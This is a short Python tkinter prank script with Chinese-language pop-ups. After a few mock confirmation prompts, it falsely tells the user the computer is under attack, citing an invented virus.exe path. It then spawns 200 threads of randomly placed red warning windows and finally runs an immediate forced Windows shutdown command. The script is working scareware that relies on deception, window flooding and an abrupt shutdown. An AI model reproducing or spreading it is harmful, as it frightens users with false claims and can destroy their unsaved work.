import tkinter.messagebox
import tkinter as tk
import random
import threading
import time
import os
n=0
w='''你的电脑正在被攻击！
请不要关闭正在运行的程序，否则会丢失信息
点击‘确定’进行下一步操作'''
f='''你的电脑正在被攻击！
请不要关闭正在运行的程序，否则会丢失信息
攻击路径：C://Users/appdata/dghgha/langtgdwqi/poquue/sittings/virus.exe'''
tkinter.messagebox.askyesno('python3.12','是否要打开此程序？')
tkinter.messagebox.showinfo('提示','你一定要想好了哈')
tkinter.messagebox.askyesno('提示','最后一次警告！你真的要打开吗？')
tkinter.messagebox.showinfo('提示','我对一会要发生的事情没有丝毫歉意，我已经给过你警告了')
 
def boom():
    window = tk.Tk()
    width = window.winfo_screenwidth()
    height = window.winfo_screenheight()
    a = random.randrange(0, width)
    b = random.randrange(0, height)
    window.title('警告')
    window.geometry("200x50" + "+" + str(a) + "+" + str(b))
    tk.Label(window, text='你的电脑即将*!', bg='red',
    font=('宋体', 17), width=30, height=4).pack()
    window.mainloop()
time.sleep(1)
tkinter.messagebox.showwarning('warning',w)
 
 
threads = []
for i in range(200):
    t = threading.Thread(target=boom)
    threads.append(t)
    time.sleep(0)
    threads[i].start()
time.sleep(2.5)
for h in range(100):
    tkinter.messagebox.showwarning('warning',f)
    time.sleep(0.2)
    tkinter.messagebox.showinfo('提示','Goodbye')
    time.sleep(1)
    os.system('shutdown -s -t 0')
